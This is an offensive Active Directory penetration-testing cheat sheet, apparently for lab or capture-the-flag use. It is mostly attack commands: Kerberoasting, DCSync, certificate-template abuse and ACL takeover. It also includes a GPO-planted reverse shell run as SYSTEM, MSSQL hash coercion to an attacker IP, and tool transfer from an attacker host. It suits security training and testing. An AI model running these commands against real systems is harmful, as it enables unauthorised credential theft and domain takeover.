## Flow at a glance
- 1) Recon baseline -> open ports and services (note clock skew for Kerberos)
- 2) Branch: Web or AD quickstart based on exposure
- 3) Validate creds (SMB/WinRM/FTP/MSSQL/SSH with Kerberos if needed)
- 4) Pivot via creds, files, or ACLs (check hidden files & Recycle Bin)
- 5) Escalate (Kerberoast, DCSync, AD CS, GPO abuse via WriteGPLink)
- 6) Post-foothold triage and proof
- 7) Evidence capture and timeline notes

## Decision triggers
- If LDAP/Kerberos/SMB exposed -> run AD quickstart
- If HTTP/HTTPS exposed -> run web enum
- If you get any creds -> validate (SMB/WinRM/FTP/MSSQL)
- If KRB_AP_ERR_SKEW error -> sync time to DC (check nmap clock skew)
- If NTLM disabled or SSH on Windows -> use Kerberos auth workflow
- If AD present -> collect BloodHound to find pivot paths
- If WriteGPLink permission found in BloodHound -> GPO abuse for SYSTEM
- If vaults/files found -> crack and re-validate creds
- If config files found -> check for base64-encoded passwords
- If Windows shell obtained -> check hidden files and Recycle Bin

## Output files
- Use `nmap -oA nmap/<name>` and `ffuf -o ffuf/<name>.json` for clean artifacts
- Use `cmd.log` as the timeline spine; use `out.log` only for evidence snippets
- Keep loot and evidence in `loot/` and `evidence/`

## Recon baseline
**Command**
- `ping <IP>` or `nc -vz <IP> 80` if ICMP is blocked
- `nmap -p- --min-rate=3000 -Pn -oN nmap/OpenPorts.txt <IP>`
- `ports=$(awk '/^[0-9]+\/tcp/ {print $1}' nmap/OpenPorts.txt | cut -d/ -f1 | paste -sd,)`
- `nmap -p$ports -sSCV --min-rate=2000 -Pn -oN nmap/ServicesVersions.txt <IP>`
- `dig @<IP> any <domain>` or attempt zone transfer if DNS is exposed

**Why**
- Establish reachability and discover all TCP services
- Run scripts and version detection only on open ports
- Identify DNS records and potential zone transfers

**Flags/Notes**
- `-p-`: all TCP ports
- `--min-rate`: speed up scan
- `-Pn`: skip host discovery
- `-oN`: save normal output to file
- `-sS`: SYN scan, `-sC`: default scripts, `-sV`: version detection

## Web (80/443)
**Command**
- `ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://<IP>/FUZZ -e .php,.txt -t 20`
- `gobuster dir -u http://<host> -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt -t 20`

**Why**
- Find hidden files, directories, and backups

**Flags/Notes**
- `-w`: wordlist
- `-u`: target URL with `FUZZ`
- `-e`: extensions
- `-t`: threads

## Active Directory quickstart
**Command**
- `smbclient -N -L //<host>`
- `ldapsearch -x -H ldap://<host> -b "DC=...,DC=..."`
- `GetNPUsers.py <realm>/ -no-pass -usersfile users.txt -dc-ip <IP> -format hashcat`
- `mssqlclient.py <user>:<pass>@<host>`
- `nxc winrm <IP> -u <user> -p <pass>`

**Why**
- Enumerate shares, LDAP objects, and Kerberos roastable users
- Validate credentials and service access

**Flags/Notes**
- `-N`: no auth, `-L`: list shares
- `-x`: simple bind, `-H`: LDAP URI, `-b`: base DN
- `-no-pass`: anonymous, `-usersfile`: user list, `-format hashcat`: crackable output
- Use `<domain>/<user>` for AD auth in MSSQL; omit domain for SQL auth
- `nxc winrm -H` for hashes, `-k` for Kerberos

## Kerberos Authentication Workflow
**Command**
```bash
# Check for clock skew in nmap output (KRB_AP_ERR_SKEW = time sync issue)
# Sync time if DC has clock offset
sudo date --set="$(date -d '+X hours')"  # Replace X with offset from nmap

# Generate krb5.conf
nxc smb <dc-hostname> -u <user> -p '<pass>' --generate-krb5-file ./krb5.conf
sudo cp ./krb5.conf /etc/krb5.conf

# Get Ticket Granting Ticket (TGT)
impacket-getTGT <domain>/<user>:'<pass>' -dc-ip <IP>

# Export ticket path
export KRB5CCNAME=~/path/to/<user>.ccache

# Verify ticket
klist

# SSH with Kerberos (if Windows OpenSSH available)
ssh -K <user>@<dc-hostname>

# Use Kerberos with other tools
impacket-smbclient -k -no-pass <domain>/<user>@<dc-hostname>
evil-winrm -i <IP> -r <realm> -u <user> -k
```

**Why**
- Kerberos auth required when NTLM is disabled or restricted
- Enables passwordless auth after TGT acquisition
- Required for Windows SSH with GSSAPI

**Flags/Notes**
- **KRB_AP_ERR_SKEW error** = clock skew > 5 minutes; must sync time to DC
- `--generate-krb5-file` creates proper realm/KDC configuration
- TGT valid for ~10 hours (renewable)
- `-K` flag enables GSSAPI (Kerberos) for SSH
- `KRB5CCNAME` environment variable points to credential cache
- Kerberos requires proper DNS resolution (`/etc/hosts` or DNS)

## AD pivot chain
**Command**
- `bloodhound-python -c ALL -u <user> -p '<pass>' -d <domain> -ns <dc-ip>`
- `net user <target> <NewPass123!>`
- `net rpc password "<target>" '<NewPass123!>' -U "<domain>/<user>"%'<pass>' -S "<dc-ip>"`
- `nxc ftp <dc-ip> -u <user> -p '<pass>' --ls`
- `nxc ftp <dc-ip> -u <user> -p '<pass>' --get <file>`
- `hashcat -m 5200 <vault>.psafe3 /usr/share/wordlists/rockyou.txt --force`
- `./targetedKerberoast.py -v -d '<domain>' -u '<user>' -p '<pass>' --use-ldaps`
- `hashcat <user>.hash /usr/share/wordlists/rockyou.txt --force`
- `secretsdump.py '<domain>/<user>:<pass>@<dc-host>'`

**Why**
- Use ACLs and creds to pivot users
- Pull sensitive files and crack vaults
- Kerberoast/DCSync for higher-priv access

**Flags/Notes**
- `-c ALL`: full BloodHound collection
- `net user` on a DC resets domain user passwords (requires object control)
- `net rpc password` performs SMB RPC reset when local syntax fails
- `--ls` list and `--get` download in NetExec FTP
- `-m 5200`: Password Safe v3
- `--use-ldaps`: use LDAPS 636
- DCSync returns NTLM hashes for domain accounts

## MSSQL playbook
**Command**
- `impacket-mssqlclient <domain>/<user>:<pass>@<IP>`
- `SELECT name FROM master.sys.databases;`
- `xp_dirtree '\\<attacker_ip>\share'`
- `xp_readerrorlog 0,1,N'Login failed';`
- `EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;`

**Why**
- Enumerate DBs and coerce hashes
- Mine logs for leaked creds
- Enable command execution if needed

**Flags/Notes**
- Use `<domain>/` for AD auth; drop domain for SQL auth
- `xp_dirtree` forces SMB auth to capture NetNTLMv2
- `xp_readerrorlog` indexes the error log and searches a term

## Credential discovery pivot
**Command**
- Check SQL error logs, LDAP `description` fields, and SMB shares
- Crack NetNTLMv2 with hashcat mode 5600
- PTH with `evil-winrm` / `nxc smb --hashes` / `psexec`

**Why**
- Convert passive intel into new authenticated access

**Flags/Notes**
- Always re-validate creds on SMB/WinRM/FTP

## GPO Abuse (WriteGPLink Privilege Escalation)
**Command (PowerShell on Windows target)**
```powershell
# Verify WriteGPLink permission (check BloodHound first)
# User must have WriteGPLink over domain or OU

# Method 1: SharpGPOAbuse (Scheduled Task to add user to Domain Admins)
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "AddDA" --Author DOMAIN\Administrator --Command "cmd.exe" --Arguments "/c net group 'Domain Admins' <user> /add /domain" --GPOName "EvilGPO"

# Method 2: Manual GPO Creation + SharpGPOAbuse (Reverse Shell as SYSTEM)
# Step 1: Create new GPO
New-GPO -name "EvilGPO"

# Step 2: Link GPO to domain root (applies to ALL computers including DCs)
New-GPLink -Name "EvilGPO" -target "DC=domain,DC=tld"

# Step 3: Generate reverse shell payload (use revshells.com)
# PowerShell #3 (Base64), encode to base64

# Step 4: Inject malicious scheduled task with SharpGPOAbuse
.\SharpGPOAbuse.exe --addcomputertask --GPOName "EvilGPO" --Author "admin" --TaskName "RevShell" --Command "powershell.exe" --Arguments "powershell -e <base64_payload>"

# Step 5: Force GPO update (speeds up propagation)
gpupdate /force

# Wait 1-2 minutes for GPO to apply on DC
# Catch reverse shell on attacker machine (nc -lnvp <port>)
```

**Why**
- WriteGPLink permission allows linking GPOs to Organizational Units
- GPOs linked to domain root apply to ALL domain computers (including DCs)
- Scheduled tasks in GPOs execute as **NT AUTHORITY\SYSTEM**
- Direct path to Domain Admin or SYSTEM shell

**Flags/Notes**
- Check BloodHound for WriteGPLink edges (not shown by whoami /all)
- **Group Policy Creator Owners** membership does NOT automatically grant WriteGPLink
- `--AddComputerTask` = creates immediate scheduled task (runs on next GPO refresh)
- GPO refresh interval: 90-120 seconds (or use `gpupdate /force`)
- Alternative targets: `DC=domain,DC=tld` (domain root) or `OU=Domain Controllers,DC=domain,DC=tld`
- SharpGPOAbuse alternatives: PowerView's `New-GPOImmediateTask`, manual SYSVOL modification
- **Non-destructive option:** Use `bloodyAD` or SharpGPOAbuse to add user to local Administrators instead of Domain Admins

**Transfer SharpGPOAbuse.exe:**
```bash
# On Kali
cd /path/to/tools
python3 -m http.server 8080

# On Windows (PowerShell)
Invoke-WebRequest -Uri "http://<attacker-ip>:8080/SharpGPOAbuse.exe" -OutFile "SharpGPOAbuse.exe"
```

## AD CS (ESC1) abuse
**Command**
- `certipy find -dc-ip <IP> -u <user> -p <pass> -enabled -vulnerable`
- `certipy req -dc-ip <IP> -u <user> -p '<pass>' -ca <CA> -template <Template> -upn administrator@<domain> -dns <dc> -outfile administrator`
- `certipy auth -pfx administrator.pfx -dc-ip <IP>`
- `KRB5CCNAME=administrator.ccache evil-winrm -i <IP> -r <realm> -u administrator -k`

**Why**
- Identify misconfigured templates and authenticate as higher-priv users

**Flags/Notes**
- `-enabled`: active templates only
- `-vulnerable`: highlight ESC paths
- `-upn`: spoofed principal
- `-k`: Kerberos auth; `KRB5CCNAME` points to ticket cache

## Post-foothold triage
**Command**
- `whoami /groups`, `whoami /priv`, `hostname`, `ipconfig /all`
- Check `C:\Users\<user>\Desktop`, `C:\Users\Public`, scheduled tasks/services

**Why**
- Confirm privileges and identify quick-win loot

**Flags/Notes**
- If lateral movement is needed, validate WinRM/SMB reachability to other hosts

## Windows Hidden File Enumeration
**Command (PowerShell)**
```powershell
# View hidden files and directories
Get-ChildItem -Force
Get-ChildItem -Path C:\ -Force

# Recursively search for hidden files
Get-ChildItem -Path C:\Users\<user> -Recurse -Force -ErrorAction SilentlyContinue

# Filter only hidden files
Get-ChildItem -Recurse -Force | Where-Object {$_.Attributes -match "Hidden"}

# Check PowerShell command history (credentials often leak here!)
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# Enumerate Recycle Bin (deleted files)
Get-ChildItem -Path C:\$RECYCLE.BIN -Recurse -Force

# Read metadata from $I files (shows original path/filename)
Format-Hex 'C:\$RECYCLE.BIN\{SID}\$I...'

# Common hidden file locations
Get-ChildItem -Force C:\Users\<user>\AppData\Roaming
Get-ChildItem -Force C:\Users\<user>\AppData\Local
Get-ChildItem -Force C:\Users\<user>\Desktop
Get-ChildItem -Force C:\ProgramData
```

**Why**
- Hidden files often contain credentials, config files, or sensitive data
- Recycle Bin may have deleted archives, scripts, or credential stores
- PowerShell history frequently contains plaintext passwords

**Flags/Notes**
- `-Force` = show hidden, system, and other normally hidden files
- Mode column: `d--hs` = Directory, Hidden, System
  - Position 1: `d` = directory, `-` = file
  - Position 4: `h` = hidden
  - Position 5: `s` = system
- **Recycle Bin structure:**
  - `C:\$RECYCLE.BIN\{USER-SID}\`
  - `$I` files = metadata (148 bytes, contains original path/filename)
  - `$R` files = actual deleted content (recover these!)
- `Format-Hex` reveals Unicode strings in binary metadata files
- **No naming convention** for hidden files in Windows (unlike Linux `.files`)
- Files are hidden via attributes, not filename patterns

## Base64 Decoding in Config Files
**Command**
```bash
# Identify base64 (look for = padding at end)
cat config.ini | grep '='

# Decode base64 strings
echo 'IXN1QmNpZ0BNZWhUZWQhUgo=' | base64 -d

# Decode from file
base64 -d encoded.txt > decoded.txt
```

**Why**
- Config files often obfuscate passwords with base64 encoding
- Common in WAPT, application configs, deployment scripts

**Flags/Notes**
- Base64 strings often end with `=` or `==` (padding)
- Not encryption, just encoding (easily reversible)
- Always check config files for: `password`, `secret`, `key`, `token` fields

## File Transfer Methods

### Linux to Windows
**Method 1: Python HTTP Server + PowerShell Download (Most Reliable)**
```bash
# On Kali (attacker)
cd /path/to/files
python3 -m http.server 8080

# On Windows (PowerShell)
Invoke-WebRequest -Uri "http://<attacker-ip>:8080/<file>" -OutFile "<file>"
# Short alias
iwr -Uri "http://<attacker-ip>:8080/<file>" -OutFile "<file>"
```

**Method 2: SCP with Kerberos (requires Kerberos auth setup)**
```bash
# From Kali to Windows (if TGT is active)
scp 'user@hostname:C:/$PATH/$TO/$FILE' ./local-file

# Windows path format: C:/ (forward slashes, not backslashes)
# Protect $ in filenames with single quotes
```

**Method 3: certutil (Built-in Windows downloader)**
```cmd
# On Windows (CMD or PowerShell)
certutil -urlcache -f http://<attacker-ip>:8080/<file> C:\path\to\output
```

**Method 4: SMB (requires admin access to C$)**
```bash
# From Kali
impacket-smbclient <domain>/<user>:'<pass>'@<IP>
use C$
cd path\to\directory
put <local-file>
get <remote-file>
```

### Windows to Linux
**Method 1: SCP (with Kerberos or password auth)**
```bash
# From Kali
scp 'user@hostname:C:/$PATH/$FILE' ./destination

# Works with active Kerberos TGT or password auth
```

**Method 2: SMB Mount (as client)**
```bash
# On Kali, share a directory
impacket-smbserver share /path/to/share -smb2support

# On Windows, copy to share
copy C:\path\to\file \\<attacker-ip>\share\
```

**Method 3: Base64 Encoding (for small text files only)**
```bash
# On Windows (PowerShell)
$content = Get-Content -Path "C:\path\to\file" -Raw
[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($content))

# Copy base64 output, paste on Kali
echo '<base64-string>' | base64 -d > file
```

**Flags/Notes**
- **Avoid base64 for binaries** (files >100KB become unwieldy)
- SCP Windows path format: `C:/` (forward slashes), `$` must be quoted
- `Invoke-WebRequest` is PowerShell's wget/curl equivalent
- certutil works on all Windows versions but may be flagged by AV
- Python HTTP server port 8080 (or any high port) to avoid permission issues

---

## Kerberoasting — Decision Tree & Command Guide

### When to Kerberoast

**Decision Triggers:**
- You have valid domain credentials (any authenticated user)
- You see SPNs (Service Principal Names) in domain — `GetUserSPNs` is your first check
- You're looking for crackable service account passwords
- BloodHound shows no direct ACL abuse paths (Kerberoasting is a "lateral movement via password cracking" fallback)

**When NOT to Kerberoast:**
- You already have the hash or admin access (skip it)
- No SPNs exist (quick to confirm — just run the check)
- All SPNs are on machine accounts (SYSTEM@ SPNs are usually uncrackable)

### Decision Flow

```
Do you have valid AD creds?
  ├── NO → Try AS-REP Roasting (pre-auth disabled users: GetNPUsers)
  └── YES → Run GetUserSPNs
        ├── No SPNs found → Dead end, pursue other paths
        ├── SPNs on MACHINE accounts only → Usually uncrackable, skip
        └── SPNs on USER accounts → Request TGS tickets → Crack offline
              ├── Cracked → New credential! Validate and pivot
              └── Not cracked → Weak wordlist, try larger / different hash mode
```

### Step 1: Sync Time (ALWAYS FIRST)

```bash
# Fix: disable the NTP service that keeps resetting your time
sudo systemctl stop systemd-timesyncd
sudo systemctl disable systemd-timesyncd
sudo ntpdate -s <DC_IP>
```

- **`systemctl stop/disable`** = stops and prevents systemd-timesyncd from overwriting
- **`ntpdate -s`** = silently sync your clock to the DC's time
- **Why:** Kerberos requires client/server clocks within ±5 minutes (`KRB_AP_ERR_SKEW`)

### Step 2: List Kerberoastable Accounts

```bash
impacket-GetUserSPNs <domain>/<user>:'<pass>' -dc-ip <DC_IP>
```

- **`<domain>/<user>:'<pass>'`** = your authenticated credentials (format: `domain/user:pass`)
- **`-dc-ip`** = IP of Domain Controller (must resolve Kerberos traffic)
- **No `-request` flag yet** = lists SPNs without requesting tickets (fast recon)

**What you'll see:**
```
ServiceName   SPN                              Name         CipherType
----------    ---                              ----         ----------
SQL           MSSQLSvc/db01.domain.com:1433    sql_svc      RC4-HMAC
HTTP          HTTP/web01.domain.com            web_svc      AES256-CTS-HMAC-SHA1-96
```

**Interpretation:**
- `ServiceName` = the service type
- `SPN` = the full principal name (service/host:port)
- `Name` = the **user account** backing this SPN — this is what you're attacking
- `CipherType` = **RC4-HMAC (mode 13100)** is faster to crack than **AES256 (mode 19700)**

### Step 3: Request and Capture TGS Hashes

```bash
impacket-GetUserSPNs <domain>/<user>:'<pass>' -dc-ip <DC_IP> -request
```

- **`-request`** = actually request TGS tickets (the crackable hashes)
- Output: `$krb5tgs$23$*...` strings — save these directly

**Save output:**
```bash
impacket-GetUserSPNs <domain>/<user>:'<pass>' -dc-ip <DC_IP> -request -output kerberoast_hashes.txt
```

- **`-output`** = writes hashes to file for offline cracking

### Step 3b: Targeted Kerberoast (attack one specific account)

```bash
python3 targetedKerberoast.py -d '<domain>' -u '<user>' -p '<pass>' --use-ldaps -t <target_user>
```

- **`-d`** = domain name
- **`-u` / `-p`** = your credentials
- **`--use-ldaps`** = LDAPS (port 636) instead of LDAP — use when standard LDAP is blocked
- **`-t`** = specific target account (attack only one SPN)

### Step 4: Crack Hashes Offline

```bash
# RC4 hashes (mode 13100) — most common, faster to crack
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt --force

# AES256 hashes (mode 19700) — slower
hashcat -m 19700 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt --force
```

- **`-m 13100`** = Kerberos TGS-REP etype 23 (RC4)
- **`-m 19700`** = Kerberos TGS-REP etype 18 (AES256)
- **`--force`** = run even with performance warnings (fine for lab)

**Cracked result:**
```
$krb5tgs$23$*sql_svc*...:Password123!
```
- Everything after the last `:` is the **plaintext password**

### Step 5: Validate New Credentials

```bash
nxc smb <DC_IP> -u <cracked_user> -p '<cracked_pass>'
```

### AS-REP Roasting (Kerberoast's Companion)

**When:** No valid creds yet, or looking for accounts with pre-auth disabled

```bash
# Anonymous — no creds needed
impacket-GetNPUsers <domain>/ -no-pass -dc-ip <DC_IP> -format hashcat

# With a user list
impacket-GetNPUsers <domain>/ -usersfile users.txt -dc-ip <DC_IP> -format hashcat
```

- **`GetNPUsers`** = Get accounts with No Pre-auth (AS-REP Roasting)
- **`-usersfile`** = file with one username per line to check
- **`-no-pass`** = don't prompt for password (anonymous)
- **`-format hashcat`** = output in crackable format
- **Crack mode:** `hashcat -m 18200`

---

## Impacket Suite — Tool Map & Decision Guide

### Quick-Reference: Which Tool for Which Job

```
NEED TO...                          USE THIS TOOL
──────────────────────────────────────────────────────────
List Kerberoastable accounts?       impacket-GetUserSPNs
Find pre-auth disabled accounts?    impacket-GetNPUsers
Request Kerberos TGT?               impacket-getTGT
Dump AD hashes (DCSync)?            impacket-secretsdump
Connect to MSSQL?                   impacket-mssqlclient
Browse SMB shares?                  impacket-smbclient
Run commands on Windows?            impacket-psexec
Change object ownership?            impacket-owneredit
Modify ACL/DACL?                    impacket-dacledit
Relay NTLM auth?                    impacket-ntlmrelayx
Serve SMB share (capture hashes)?   impacket-smbserver
```

### impacket-GetUserSPNs (Kerberoasting)

**When:** You have creds + want to find crackable service passwords

```bash
# List SPNs only (fast recon)
impacket-GetUserSPNs <domain>/<user>:'<pass>' -dc-ip <DC_IP>

# List + Request TGS hashes (the actual attack)
impacket-GetUserSPNs <domain>/<user>:'<pass>' -dc-ip <DC_IP> -request

# Save hashes to file
impacket-GetUserSPNs <domain>/<user>:'<pass>' -dc-ip <DC_IP> -request -output hashes.txt

# With NT hash instead of password
impacket-GetUserSPNs <domain>/<user> -dc-ip <DC_IP> -hashes ':<NT_HASH>' -request
```

- **`-hashes ':<NT_HASH>'`** = authenticate with hash (Pass-the-Hash)
- Note the colon before the hash: `:<hash>` = NTLM-only hash (no LM prefix)

### impacket-GetNPUsers (AS-REP Roasting)

**When:** No creds yet, or looking for accounts without pre-auth

```bash
# Anonymous enumeration
impacket-GetNPUsers <domain>/ -no-pass -dc-ip <DC_IP> -format hashcat

# With user list
impacket-GetNPUsers <domain>/ -usersfile users.txt -dc-ip <DC_IP> -format hashcat
```

### impacket-getTGT (Kerberos Ticket Acquisition)

**When:** Need a TGT for Kerberos-based attacks (PKINIT, Kerberos auth tools)

```bash
# Password auth
impacket-getTGT <domain>/<user>:'<pass>' -dc-ip <DC_IP>

# Hash auth
impacket-getTGT <domain>/<user> -dc-ip <DC_IP> -hashes ':<NT_HASH>'

# Certificate auth (PKINIT — after certipy exploitation)
impacket-getTGT <domain>/<user> -dc-ip <DC_IP> -cert-file <user>.pfx
```

- Saves ticket to `<user>.ccache`
- **After running:** `export KRB5CCNAME=./<user>.ccache`
- **Verify:** `klist`

### impacket-secretsdump (DCSync)

**When:** You have creds with replication rights → dump ALL domain hashes

```bash
# With password
impacket-secretsdump '<domain>/<user>:<pass>@<DC_HOSTNAME>'

# With NT hash
impacket-secretsdump '<domain>/<user>@<DC_HOSTNAME>' -hashes ':<NT_HASH>'

# Local dump only (on the machine, not DCSync)
impacket-secretsdump -local '<domain>/<user>:<pass>@<DC_HOSTNAME>'
```

- **`-local`** = dump from local machine only (no DCSync, less noisy)
- **Without `-local`** = performs DCSync (requires DS-Replication-Get-Changes)
- **Output includes:** All user NT hashes, krbtgt hash (Golden Ticket material)

### impacket-smbclient (SMB File Browser)

**When:** Browse shares, transfer files, enumerate content

```bash
impacket-smbclient '<domain>/<user>:<pass>@<DC_HOSTNAME>'

# Interactive commands:
# shares          → list shares
# use <share>     → connect to share
# ls              → list files
# get <file>      → download file
# put <file>      → upload file
# cd <dir>        → change directory
```

### impacket-mssqlclient (MSSQL Connection)

**When:** MSSQL on target, have credentials

```bash
# AD authentication (user is domain account)
impacket-mssqlclient <domain>/<user>:'<pass>'@<IP>

# SQL authentication (user is local SQL account)
impacket-mssqlclient <user>:'<pass>'@<IP>
```

- **Key difference:** Include `<domain>/` prefix for AD auth, omit for SQL auth

### impacket-owneredit (Change Object Ownership)

**When:** BloodHound shows WriteOwner → take ownership of target object

```bash
impacket-owneredit -action write -new-owner '<domain>\\<your_user>' -target '<target_user_or_group>' '<domain>/<your_user>:<pass>' -dc-ip <DC_IP>
```

- **`-action write`** = change the owner (use `read` to see current owner)
- **`-new-owner`** = who becomes the new owner (backslash notation: `domain\\user`)
- **`-target`** = the AD object you're taking ownership of
- **Why you want this:** As owner, you can then modify the DACL (next tool)

### impacket-dacledit (Modify ACL Permissions)

**When:** You own an object (or have WriteDACL) → grant yourself permissions

```bash
impacket-dacledit -action write -rights 'WriteMembers' -target '<target_group>' -new-rights-principal '<domain>\\<your_user>' '<domain>/<your_user>:<pass>' -dc-ip <DC_IP>
```

- **`-action write`** = add an ACE (use `read` to see current ACLs)
- **`-rights`** = specific right to grant (WriteMembers, GenericWrite, ResetPassword)
- **`-new-rights-principal`** = who gets the permission (backslash notation)
- **Chain:** owneredit (take ownership) → dacledit (grant rights) → exploit the rights

### impacket-psexec (Remote Execution)

**When:** Need to run commands on Windows without WinRM

```bash
impacket-psexec '<domain>/<user>:<pass>@<DC_HOSTNAME>' '<command>'
```

---

## Certipy — Full Workflow Guide

### The 5 Core Certipy Commands

```
certipy find        → Enumerate CAs, templates, vulnerabilities
certipy req         → Request a certificate from a CA
certipy auth        → Authenticate to DC using a certificate (get TGT/NT hash)
certipy shadow      → Shadow Credentials attack (extract NT hash non-destructively)
certipy account     → Modify AD account attributes (UPN manipulation for ESC9)
```

### Step 1: Find (Enumeration)

```bash
certipy find -dc-ip <DC_IP> -u <user>@<domain> -p '<pass>'
```

**Common additions:**
```bash
# Only enabled templates (reduces noise)
certipy find -dc-ip <DC_IP> -u <user>@<domain> -p '<pass>' -enabled

# Only vulnerable templates
certipy find -dc-ip <DC_IP> -u <user>@<domain> -p '<pass>' -enabled -vulnerable

# With hash auth
certipy find -dc-ip <DC_IP> -u <user>@<domain> -hashes ':<NT_HASH>' -enabled -vulnerable
```

- **`-enabled`** = filter to only active templates
- **`-vulnerable`** = only show templates with known ESC vulnerabilities
- **`-hashes`** = authenticate with NT hash instead of password

**Key output fields:**
```
Template Name                       : ExampleTemplate
Enabled                             : True        ← Must be True
Client Authentication               : True        ← Must be True for ESC1
Enrollee Supplies Subject           : True        ← ESC1 trigger
Enrollment Permissions
  Enrollment Rights                 : DOMAIN\someuser  ← Can YOU enroll?
[!] Vulnerabilities
  ESC1                              : ...        ← Exploitable!
  ESC9                              : NoSecurityExtension ← UPN manipulation
```

**Decision after `certipy find`:**
```
What vulnerabilities are flagged?
  ├── ESC1 → Enrollee Supplies Subject + Client Auth
  │    └── certipy req with -upn (spoof UPN directly)
  ├── ESC9 → NoSecurityExtension flag
  │    └── certipy account update (change UPN) → req → auth → restore UPN
  ├── ESC4 → Template has writable properties
  │    └── certipy template modify (add ESC1) → req → auth
  ├── No ESC flagged → Check enrollment rights
  │    └── Can you enroll? If not, find ACL path to someone who can
  └── Only Shadow Credentials viable → certipy shadow
```

### Step 2: Request a Certificate (certipy req)

**ESC1 — Spoof UPN directly (you control Subject Alternative Name):**
```bash
certipy req -dc-ip <DC_IP> -u <enrolling_user>@<domain> -p '<pass>' -ca <CA_NAME> -template <TEMPLATE_NAME> -upn administrator@<domain>
```

- **`-u <enrolling_user>`** = user WITH enrollment rights on the template
- **`-ca <CA_NAME>`** = exact CA name from `certipy find` output
- **`-template <TEMPLATE_NAME>`** = exact template name from `certipy find`
- **`-upn administrator@<domain>`** = the identity you're spoofing (target)
- **Output:** `administrator.pfx` (certificate + private key)

**ESC9 — UPN must be changed FIRST** (see ESC9 section below)

### Step 3: Authenticate with Certificate (certipy auth)

```bash
certipy auth -pfx <user>.pfx -dc-ip <DC_IP> -domain <domain>
```

- **`-pfx`** = the certificate file from `certipy req`
- **Output:** TGT (`<user>.ccache`) + NT hash extracted from PAC
- **NT hash:** Copy this — it's your Pass-the-Hash credential

**After auth:**
```bash
# Option A: Use TGT (Kerberos auth)
export KRB5CCNAME=<user>.ccache
evil-winrm -i <DC_IP> -r <REALM> -u <user> -k

# Option B: Use NT hash (Pass-the-Hash)
evil-winrm -i <DC_IP> -u <user> -H '<NT_HASH>'
```

### Step 4: Shadow Credentials (certipy shadow)

**When:** You have Write access to target's `msDS-KeyCredentialLink` (GenericWrite, GenericAll, or specific WriteProperty)

```bash
# All-in-one: create cert → add Key Credential → authenticate → extract hash
certipy shadow auto -u <your_user>@<domain> -p '<pass>' -account <target_user> -dc-ip <DC_IP>

# Manual workflow (if auto fails):
certipy shadow add -u <your_user>@<domain> -p '<pass>' -account <target_user> -dc-ip <DC_IP>
certipy shadow auth -username <target_user> -dc-ip <DC_IP>
```

- **`shadow auto`** = automated full chain
- **`-account <target_user>`** = the user whose hash you want (you must have Write access to this user)
- **`shadow add`** = only adds Key Credential attribute
- **`shadow auth`** = authenticates using the Key Credential
- **Output:** NT hash for target_user

**Common issue:** If `auto` fails, try splitting into `add` + `auth` separately.

### Step 5: Account Update (certipy account — for ESC9)

**When:** ESC9 vulnerability (NoSecurityExtension on template)

```bash
certipy account update -u <your_user>@<domain> -p '<pass>' -user <user_to_modify> -upn <identity_to_spoof> -dc-ip <DC_IP>
```

- **`-user <user_to_modify>`** = the account YOU CONTROL (e.g., ca_operator)
- **`-upn <identity_to_spoof>`** = who you want to become (e.g., Administrator)
- **You must have GenericWrite or equivalent over the `-user` target**

### ESC9 Full Attack Chain

```bash
# Step 1: Change controlled user's UPN to Administrator
certipy account update -u <your_user>@<domain> -p '<pass>' -user <controlled_user> -upn Administrator -dc-ip <DC_IP>

# Step 2: Request certificate (cert has Administrator UPN, but no objectSid)
certipy req -dc-ip <DC_IP> -u <controlled_user>@<domain> -p '<controlled_pass>' -ca <CA_NAME> -template <TEMPLATE_NAME>

# Step 3: RESTORE controlled user's UPN (cleanup)
certipy account update -u <your_user>@<domain> -p '<pass>' -user <controlled_user> -upn <controlled_user>@<domain> -dc-ip <DC_IP>

# Step 4: Authenticate → get Administrator's NT hash
certipy auth -pfx administrator.pfx -dc-ip <DC_IP> -domain <domain>
```

**Why ESC9 works:**
- Templates with `NoSecurityExtension` flag don't embed the user's `objectSid`
- Normally KDC checks: "Does the SID in this cert match the account?" → denied if mismatch
- Without SID: KDC authenticates by **UPN alone** → if UPN says "Administrator", you get Administrator's TGT
- **Attack direction:** You modify the account **you control**, not the target
- Step 3 (restore) prevents the controlled account from staying broken

---

## Evidence capture
**Command**
- `| tee logs/<name>.txt` for readable output
- `> logs/<name>.txt 2>&1` for large output

**Why**
- Keep clean artifacts for writeups and proof

**Flags/Notes**
- Save outputs to `logs/` and loot to `loot/`
- Note flag paths and commands used
